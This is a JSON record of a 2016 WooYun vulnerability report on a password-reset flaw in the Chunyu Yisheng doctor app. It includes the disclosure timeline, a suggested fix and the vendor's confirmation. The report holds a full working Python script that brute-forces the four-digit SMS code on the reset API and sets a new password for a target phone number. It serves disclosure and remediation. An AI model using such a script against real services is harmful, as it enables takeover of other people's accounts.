{"id": 85599, "wybug_id": "wooyun-2016-0172030", "wybug_title": "春雨医生某客户端重置任意密码漏洞", "wybug_corp": "春雨天下软件有限公司", "wybug_author": "想要减肥的胖纸", "wybug_date": "2016-01-22 22:15", "wybug_open_date": "2016-03-10 16:42", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计错误", "手机短信"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-02-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-02-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-03-10：\t细节向公众公开  简要描述： 验证码只有4位，可暴力破解出来。 详细说明：  服务器端应该有设置并发数量，导致利用burp或者其他软件会提示503错误\n\n通过自写代码，设置延迟100毫秒提交，可进行暴力破解\n#!/usr/bin/env python# -*- coding: utf-8 -*-import requestsimport timeheader = {    \"Content-Type\": \"application/x-www-form-urlencoded\",    \"Accept\": \"*/*\",    \"Connection\": \"keep-alive\",    \"User-Agent\": \"ChunyuClinic/4.4.01228 (iPhone; iOS 9.2.1; Scale/3.00)\",    \"Accept-Language\": \"zh-Hans-CN;q=1, en-CN;q=0.9\",    \"Accept-Encoding\": \"gzip, deflate\"        }url = 'http://api.chunyuyisheng.com//accounts/new_reset_password/?platform=iPhone&systemVer=9.2.1&version=4.4.0&vendor=ziyou&deviceModel=iPhone&build=4.4.01228&push_id=fd28d31fce54fffdddddda9efdec3e04611d1fe7d1a56ba457d1f8c64baa&device_id=497de98adasdasd121fafe49f0b6bd&app=1&client=DoctorClient'for i in xrange(0,9999):    code = '{0:04}'.format(i)    payload = {'activation_num':code,'cellphone':'13901234567','password':'12345678@'}    rs = requests.post(url,data=payload,headers=header)    rs = rs.status_code    #print rs        if rs == 200:        print code+\"password change 12345678@\"    else:        print rs    time.sleep(0.1)\n   漏洞证明：  \n\n后来改了密码，不知道为何登录不上，换了个自己的手机号重新注册医生用户，然后尝试找回密码，成功。如图\n\n   修复方案：  限制验证码有效时间为5分钟内，验证码6位以上。   版权声明：转载请注明来源 想要减肥的胖纸@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2016-01-27 09:56 厂商回复： 已修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-01-22 23:24 |    \t\tddy \t\t\t( 实习白帽子  |\t\t\t        Rank:45 漏洞数:17        | 其实第一次要我挖洞我是拒绝的。因为，你不...)\t\t \n  简要描述亮了。。    \n     2016-02-16 13:51 |    \t\tMe_Fortune \t\t\t( 普通白帽子  |\t\t\t        Rank:306 漏洞数:102        | The quiter you are,the more you're able ...)\t\t \n  机智    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}